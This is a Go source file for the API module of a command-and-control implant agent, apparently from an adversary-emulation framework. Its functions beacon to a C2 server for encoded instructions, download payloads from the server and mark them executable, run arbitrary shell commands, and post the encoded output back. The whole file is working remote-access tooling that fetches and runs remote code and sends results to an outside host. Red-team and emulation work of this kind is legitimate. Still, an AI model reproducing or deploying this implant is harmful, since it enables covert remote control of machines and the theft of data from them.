package api

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"../execute"
	"../util"
)

const (
	OK = 200
)

// Instructions is a single call to the C2
func Instructions(profile map[string]interface{}) map[string]interface{} {
	data, _ := json.Marshal(profile)
	address := fmt.Sprintf("%s/sand/instructions", profile["server"])
	bites := request(address, data)
	var out map[string]interface{}
	if bites != nil {
		fmt.Println("[+] beacon: ALIVE")
		var commands interface{}
		json.Unmarshal(bites, &out)
		json.Unmarshal([]byte(out["instructions"].(string)), &commands)
		out["sleep"] = int(out["sleep"].(float64))
		out["instructions"] = commands
	} else {
		fmt.Println("[-] beacon: DEAD")
	}
	return out
}

// Drop the payload
func Drop(server string, payload string) string {
	location := filepath.Join(payload)
	if len(payload) > 0 && util.Exists(location) == false {
		fmt.Println(fmt.Sprintf("[*] Downloading new payload: %s", payload))
		address := fmt.Sprintf("%s/file/download", server)
		req, _ := http.NewRequest("POST", address, nil)
		req.Header.Set("file", payload)
		req.Header.Set("platform", string(runtime.GOOS))
		client := &http.Client{}
		resp, err := client.Do(req)
		if err == nil && resp.StatusCode == OK {
			writePayload(location, resp)
		}
	}
	return location
}

// Execute executes a command and posts results
func Execute(profile map[string]interface{}, command map[string]interface{}, payloads []string) {
	cmd := string(util.Decode(command["command"].(string)))
	var status string
	var result []byte
	missingPaths := checkPayloadsAvailable(payloads)
	if len(missingPaths) == 0 {
		result, status = execute.Execute(cmd, command["executor"].(string), profile["platform"].(string))
	} else {
		result = []byte(fmt.Sprintf("Payload(s) not available: %s", strings.Join(missingPaths, ", ")))
		status = execute.ERROR_STATUS
	}
	sendExecutionResults(command["id"], profile["server"], result, status, cmd)
}

// ExecuteInstruction takes the command and profile and executes that command step
func ExecuteInstruction(command map[string]interface{}, profile map[string]interface{}) {
	fmt.Printf("[*] Running instruction %.0f\n", command["id"])
	payloads := strings.Split(strings.Replace(command["payload"].(string), " ", "", -1), ",")
	var droppedPayloads []string
	for _, payload := range payloads {
		if len(payload) > 0 {
			droppedPayloads = append(droppedPayloads, Drop(profile["server"].(string), payload))
		}
	}
	Execute(profile, command, droppedPayloads)
}

func sendExecutionResults(command_id interface{}, server interface{}, result []byte, status string, cmd string) {
	address := fmt.Sprintf("%s/sand/results", server)
	link := fmt.Sprintf("%f", command_id.(float64))
	data, _ := json.Marshal(map[string]string{"link_id": link, "output": string(util.Encode(result)), "status": status})
	request(address, data)
	if cmd == "die" {
		fmt.Println("[+] Shutting down...")
		util.StopProcess(os.Getpid())
	}
}

func request(address string, data []byte) []byte {
	req, _ := http.NewRequest("POST", address, bytes.NewBuffer(util.Encode(data)))
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	body, _ := ioutil.ReadAll(resp.Body)
	return util.Decode(string(body))
}

func writePayload(location string, resp *http.Response) {
	dst, _ := os.Create(location)
	defer dst.Close()
	_, _ = io.Copy(dst, resp.Body)
	os.Chmod(location, 0500)
}

func checkPayloadsAvailable(payloads []string) []string {
	var missing []string
	for i := range payloads {
		if util.Exists(filepath.Join(payloads[i])) == false {
			missing = append(missing, payloads[i])
		}
	}
	return missing
}